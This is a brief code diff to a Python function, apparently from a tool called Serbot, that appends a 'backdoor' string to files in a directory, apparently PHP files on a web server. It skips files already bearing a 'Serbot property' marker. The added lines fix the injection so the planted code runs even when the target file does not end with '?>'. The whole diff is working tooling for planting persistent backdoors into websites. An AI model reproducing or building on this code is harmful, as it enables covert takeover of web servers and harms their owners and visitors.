@@ -354,6 +354,11 @@ def debackdoor(thedir):
 			f.close()
 
 			if ("#This is a Serbot property" not in inside):
+				alllines = inside.split('\n')
+				if (alllines[len(alllines)-1] != "?>"):
+					global backdoor
+					backdoor = "?>\n%s" % backdoor
+
 				f = open(thefile, "a")
 				f.write(backdoor)
 				f.close()
